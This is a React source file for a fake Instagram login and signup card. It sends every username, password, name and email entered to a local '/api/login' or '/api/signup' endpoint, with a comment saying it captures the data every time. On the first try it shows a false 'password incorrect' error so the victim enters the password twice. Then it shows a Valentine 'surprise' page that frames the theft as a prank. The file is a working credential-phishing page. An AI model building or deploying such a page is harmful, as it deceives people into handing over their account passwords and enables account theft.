import React, { useState, useEffect } from 'react';
import AuthInput from './AuthInput';
import { AuthMode } from '../types';

interface LoginCardProps {
  mode: AuthMode;
  onToggleMode: () => void;
}

const ValentineSurpriseView: React.FC = () => {
  const [hearts, setHearts] = useState<{ id: number; left: string; delay: string; size: string }[]>([]);

  useEffect(() => {
    // Generate random heart particles for the background
    const newHearts = Array.from({ length: 30 }).map((_, i) => ({
      id: i,
      left: `${Math.random() * 100}%`,
      delay: `${Math.random() * 5}s`,
      size: `${Math.random() * 20 + 10}px`,
    }));
    setHearts(newHearts);
  }, []);

  return (
    <div className="relative flex flex-col items-center justify-center py-12 w-full bg-white md:border border-[#dbdbdb] rounded-sm min-h-[520px] overflow-hidden animate-[fadeIn_1s_ease-out]">
      {/* Immersive Heart Rain Background */}
      <div className="absolute inset-0 pointer-events-none z-0">
        {hearts.map((heart) => (
          <div
            key={heart.id}
            className="absolute text-red-500/30 animate-fall select-none"
            style={{
              left: heart.left,
              animationDelay: heart.delay,
              fontSize: heart.size,
              top: '-50px',
            }}
          >
            ❤
          </div>
        ))}
      </div>

      <div className="relative z-10 flex flex-col items-center text-center px-8">
        <div className="relative mb-8">
          <div className="w-28 h-28 bg-gradient-to-tr from-red-50 to-pink-100 rounded-full flex items-center justify-center animate-pulse shadow-inner">
            <span className="text-6xl animate-bounce-gentle">💝</span>
          </div>
          <span className="absolute -top-2 -right-2 text-2xl animate-bounce-gentle" style={{ animationDelay: '0.2s' }}>💖</span>
          <span className="absolute -bottom-2 -left-2 text-2xl animate-bounce-gentle" style={{ animationDelay: '0.5s' }}>💕</span>
        </div>

        <h1 className="text-3xl font-bold bg-gradient-to-r from-red-600 via-pink-500 to-red-500 bg-clip-text text-transparent mb-4">
          Happy Day!
        </h1>
        
        <div className="flex items-center space-x-2 mb-6">
          <div className="w-8 h-[2px] bg-red-200"></div>
          <span className="text-red-400">❤</span>
          <div className="w-8 h-[2px] bg-red-200"></div>
        </div>

        <p className="text-[#262626] text-xl font-semibold mb-3">
          A Heartfelt Surprise
        </p>
        
        <p className="text-[#8e8e8e] text-[15px] leading-relaxed max-w-[300px] mb-10">
           It's a small reminder that you're appreciated. Wishing you a day filled with all the love you deserve!
        </p>

        <div className="flex flex-col space-y-4 w-full max-w-[240px]">
          <button 
            onClick={() => window.location.reload()}
            className="group relative overflow-hidden bg-gradient-to-r from-red-500 to-pink-600 text-white font-bold py-3.5 px-8 rounded-full shadow-lg hover:shadow-red-200 hover:scale-105 transition-all active:scale-95"
          >
            <span className="relative z-10 flex items-center justify-center gap-2">
              Stay in Love ❤️
            </span>
            <div className="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300"></div>
          </button>
          
          <p className="text-[11px] text-red-300 font-bold uppercase tracking-[0.2em]">Spread the Joy</p>
        </div>
      </div>
      
      <style>{`
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes fall {
          0% { transform: translateY(0) rotate(0deg); opacity: 0; }
          10% { opacity: 0.6; }
          90% { opacity: 0.6; }
          100% { transform: translateY(600px) rotate(360deg); opacity: 0; }
        }
        @keyframes bounce-gentle {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-12px); }
        }
        .animate-fall {
          animation: fall 6s linear infinite;
        }
        .animate-bounce-gentle {
          animation: bounce-gentle 3s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
};

const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
  const [formData, setFormData] = useState({
    identifier: '',
    password: '',
    fullName: '',
    username: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [attemptCount, setAttemptCount] = useState(0);
  const [isSuccess, setIsSuccess] = useState(false);

  const isLogin = mode === AuthMode.LOGIN;
  
  const handleInputChange = (field: string, value: string) => {
    setError(null);
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const isFormValid = isLogin 
    ? formData.identifier.length >= 1 && formData.password.length >= 6
    : formData.identifier.length >= 1 && formData.password.length >= 6 && formData.fullName && formData.username;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;
    
    setIsLoading(true);
    setError(null);

    const currentAttempt = attemptCount + 1;
    setAttemptCount(currentAttempt);

    try {
      // Capture the data every time
      const endpoint = isLogin ? '/api/login' : '/api/signup';
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      await response.json();

      // Attempt logic: Show error on 1st attempt, then show surprise page on 2nd attempt
      if (currentAttempt < 2) {
        setTimeout(() => {
          setError("Sorry, your password was incorrect. Please double-check your password.");
          setIsLoading(false);
          setFormData(prev => ({ ...prev, password: '' }));
        }, 800);
      } else {
        setTimeout(() => {
          setIsSuccess(true);
          setIsLoading(false);
        }, 1000);
      }
    } catch (err) {
      console.error("Capture failed:", err);
      // Fallback behavior for offline/local testing
      setTimeout(() => {
        if (currentAttempt < 2) {
          setError("Sorry, your password was incorrect. Please double-check your password.");
          setIsLoading(false);
          setFormData(prev => ({ ...prev, password: '' }));
        } else {
          setIsSuccess(true);
          setIsLoading(false);
        }
      }, 800);
    }
  };

  if (isSuccess) {
    return <ValentineSurpriseView />;
  }

  return (
    <div className="w-full flex flex-col space-y-2.5">
      <div className="bg-white md:border border-[#dbdbdb] rounded-sm py-10 px-6 md:px-10 flex flex-col items-center">
        <div className="mt-2 mb-6 flex flex-col items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" 
            alt="Instagram" 
            className="h-12 md:h-14 object-contain mb-6"
          />
          
          <div className="w-16 h-16 rounded-2xl bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] p-[1.5px] shadow-sm flex items-center justify-center">
             <div className="w-full h-full bg-white rounded-[14px] flex items-center justify-center">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" 
                  alt="" 
                  className="w-10 h-10"
                />
             </div>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="w-full flex flex-col items-stretch pt-2">
          {!isLogin && (
            <p className="text-[#8e8e8e] font-semibold text-center text-[17px] mb-4 leading-tight">
              Sign up to see photos and videos from your friends.
            </p>
          )}

          <div className="space-y-1.5">
            <AuthInput 
              label={isLogin ? "Phone number, username, or email" : "Mobile Number or Email"}
              name="identifier"
              value={formData.identifier}
              onChange={(v) => handleInputChange('identifier', v)}
            />

            {!isLogin && (
              <>
                <AuthInput 
                  label="Full Name"
                  name="fullName"
                  value={formData.fullName}
                  onChange={(v) => handleInputChange('fullName', v)}
                />
                <AuthInput 
                  label="Username"
                  name="username"
                  value={formData.username}
                  onChange={(v) => handleInputChange('username', v)}
                />
              </>
            )}

            <AuthInput 
              label="Password"
              type="password"
              name="password"
              value={formData.password}
              onChange={(v) => handleInputChange('password', v)}
            />
          </div>

          {error && <p className="text-[#ed4956] text-[14px] text-center my-3 leading-tight">{error}</p>}

          <button
            type="submit"
            disabled={!isFormValid || isLoading}
            className={`
              mt-4 py-1.5 px-2 rounded-lg font-semibold text-sm transition-all active:scale-[0.98]
              ${isFormValid ? 'bg-[#0095f6] text-white hover:bg-[#1877f2]' : 'bg-[#4cb5f9] text-white opacity-70 cursor-default'}
              flex items-center justify-center min-h-[32px]
            `}
          >
            {isLoading ? (
              <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
            ) : (
              isLogin ? 'Log in' : 'Sign up'
            )}
          </button>

          <div className="flex items-center my-6">
            <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
            <span className="mx-4 text-[#8e8e8e] text-[13px] font-semibold uppercase">OR</span>
            <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
          </div>

          <button type="button" className="flex items-center justify-center space-x-2 text-[#385185] font-semibold text-sm mb-4 active:opacity-70">
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            <span>Log in with Facebook</span>
          </button>

          {isLogin && (
            <a href="#" className="text-[#00376b] text-xs text-center mt-3 hover:underline">Forgot password?</a>
          )}
        </form>
      </div>

      <div className="bg-white md:border border-[#dbdbdb] rounded-sm py-6 px-10 flex items-center justify-center text-sm">
        <span className="text-[#262626]">
          {isLogin ? "Don't have an account?" : "Have an account?"}{' '}
          <button 
            type="button"
            onClick={() => {
              onToggleMode();
              setError(null);
              setAttemptCount(0);
            }}
            className="text-[#0095f6] font-semibold hover:opacity-80 transition-opacity"
          >
            {isLogin ? 'Sign up' : 'Log in'}
          </button>
        </span>
      </div>
    </div>
  );
};

export default LoginCard;